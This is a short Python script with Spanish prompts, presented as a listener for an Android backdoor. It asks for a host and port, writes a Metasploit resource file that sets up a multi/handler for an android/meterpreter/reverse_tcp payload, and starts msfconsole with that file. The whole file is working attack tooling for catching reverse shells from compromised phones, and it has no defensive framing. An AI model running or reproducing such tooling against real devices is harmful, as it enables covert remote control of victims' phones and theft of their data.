import os 
def listener():
	print("""
  		1. Listener para Backdoor en Android 
	
	""")
	ch = raw_input("Para configurar el escuchador escriba 1? #~: ")
	if(ch=="1"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener3.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload android/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener3.rc') 
	

	
